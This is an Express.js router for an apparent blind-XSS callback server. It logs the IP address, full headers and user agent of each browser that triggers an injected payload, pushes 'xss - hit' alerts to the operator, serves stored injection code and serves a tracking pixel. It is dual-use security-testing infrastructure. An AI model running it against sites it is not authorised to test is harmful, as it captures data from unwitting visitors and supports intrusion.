const express = require('express');
const router = express.Router()
const User = require('../lib/models/User.js');
const Notification = require('../lib/models/Notification.js');
const { Expo } = require("expo-server-sdk");
const expo = new Expo();

function sendNotification (pushToken, notification) {
  try {
    if (!Expo.isExpoPushToken(pushToken)) {
      console.error(`Push token ${pushToken} is not a valid Expo push token`)
      return false
    }
    var notificationToPush = [
      {
        to: pushToken,
        sound: 'default',
        title: notification.title,
        body: notification.body,
        data: notification
      }
    ]
    let chunks = expo.chunkPushNotifications(notificationToPush)
    ;(async () => {
      for (let chunk of chunks) {
        try {
          let receipts = await expo.sendPushNotificationsAsync(chunk)
          console.log(receipts)
        } catch (error) {
          console.error(error)
        }
      }
      return true
    })()
  } catch (e) {
    console.log(e)
  }
}

router.get('/:id', function (req, res) {
  console.log(req.params.id);
  User.find({
    api_id: req.params.id,
  }).exec((err, data) => {
    if (err || data.length != 1) {
      return res.status(500).send("ko");
    } else {
      Notification.create({
        api_id: req.params.id,
        method: "GET",
        date: new Date(),
        link: req.url,
        userAgent: req.headers['user-agent'],
        body: `${req.body}`,
        header: req.headers,
        ipAddress: req.ip
      }, function(err) {
        if (err) {
          console.error(err)
        }
      })
      sendNotification(data[0].notificationId, { title: "xss - hit",
        body: req.headers['user-agent'] })
      return res.status(200).send("ok");
    }
  });
})

router.post('/:id', function (req, res) {
  console.log(req.params.id);
  User.find({
    api_id: req.params.id,
  }).exec((err, data) => {
    if (err || data.length != 1) {
      return res.status(500).send("ko");
    } else {
      Notification.create({
        api_id: req.params.id,
        method: "POST",
        date: new Date(),
        link: req.url,
        userAgent: req.headers['user-agent'],
        body: `${req.body}`,
        header: req.headers,
        ipAddress: req.ip
      }, function(err) {
        if (err) {
          console.error(err)
        }
      })
      sendNotification(data[0].notificationId, { title: "xss - hit",
        body: req.headers['user-agent'] })
      return res.status(200).send("ok");
    }
  });
})

router.put('/:id', function (req, res) {
  console.log(req.params.id);
  User.find({
    api_id: req.params.id,
  }).exec((err, data) => {
    if (err || data.length != 1) {
      return res.status(500).send("ko");
    } else {
      Notification.create({
        api_id: req.params.id,
        method: "PUT",
        date: new Date(),
        link: req.url,
        userAgent: req.headers['user-agent'],
        body: `${req.body}`,
        header: req.headers,
        ipAddress: req.ip
      }, function(err) {
        if (err) {
          console.error(err)
        }
      })
      sendNotification(data[0].notificationId, { title: "xss - hit",
        body: req.headers['user-agent'] })
      return res.status(200).send("ok");
    }
  });
})

router.delete('/:id', function (req, res) {
  console.log(req.params.id);
  User.find({
    api_id: req.params.id,
  }).exec((err, data) => {
    if (err || data.length != 1) {
      return res.status(500).send("ko");
    } else {
      Notification.create({
        api_id: req.params.id,
        method: "DELETE",
        date: new Date(),
        link: req.url,
        userAgent: req.headers['user-agent'],
        body: `${req.body}`,
        header: req.headers,
        ipAddress: req.ip
      }, function(err) {
        if (err) {
          console.error(err)
        }
      })
      sendNotification(data[0].notificationId, { title: "xss - hit",
        body: req.headers['user-agent'] })
      return res.status(200).send("ok");
    }
  });
})

router.patch('/:id', function (req, res) {
  console.log(req.params.id);
  User.find({
    api_id: req.params.id,
  }).exec((err, data) => {
    if (err || data.length != 1) {
      return res.status(500).send("ko");
    } else {
      Notification.create({
        api_id: req.params.id,
        method: "PATCH",
        date: new Date(),
        link: req.url,
        userAgent: req.headers['user-agent'],
        body: `${req.body}`,
        header: req.headers,
        ipAddress: req.ip
      }, function(err) {
        if (err) {
          console.error(err)
        }
      })
      sendNotification(data[0].notificationId, { title: "xss - hit",
        body: req.headers['user-agent'] })
      return res.status(200).send("ok");
    }
  });
})

router.get('/:id/code', function (req, res) {
  console.log(req.params.id);
  User.find({
    api_id: req.params.id,
  }).exec((err, data) => {
    if (err || data.length != 1) {
      return res.status(500).send("ko");
    } else {
      Notification.create({
        api_id: req.params.id,
        method: "GET",
        date: new Date(),
        link: req.url,
        userAgent: req.headers['user-agent'],
        body: `${req.body}`,
        header: req.headers,
        ipAddress: req.ip
      }, function(err) {
        if (err) {
          console.error(err)
        }
      })
      sendNotification(data[0].notificationId, { title: "xss - code injected",
        body: req.headers['user-agent'] })
      return res.status(200).send(data[0].code);
    }
  });
})

router.get('/:id/pic', function (req, res) {
  console.log(req.params.id);
  User.find({
    api_id: req.params.id,
  }).exec((err, data) => {
    if (err || data.length != 1) {
      return res.status(500).send("ko");
    } else {
      Notification.create({
        api_id: req.params.id,
        method: "GET",
        date: new Date(),
        link: req.url,
        userAgent: req.headers['user-agent'],
        body: `${req.body}`,
        header: req.headers,
        ipAddress: req.ip
      }, function(err) {
        if (err) {
          console.error(err)
        }
      })
      sendNotification(data[0].notificationId, { title: "xss - picture hit",
        body: req.headers['user-agent'] })
      return res.redirect(301, "/public/1px.png");
    }
  });
})

module.exports = router
